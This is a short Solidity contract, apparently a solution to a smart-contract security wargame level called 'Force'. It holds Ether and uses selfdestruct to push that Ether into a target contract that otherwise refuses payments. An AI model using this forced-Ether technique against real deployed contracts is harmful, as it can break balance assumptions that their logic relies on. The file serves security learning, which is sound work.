// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;




contract ForceSolution {

    address payable forceAddress;

    constructor(address payable _forceAddress) {
        forceAddress = _forceAddress;
    }

    receive() external payable {}

    function Bang() public {
        selfdestruct(forceAddress);
    }
}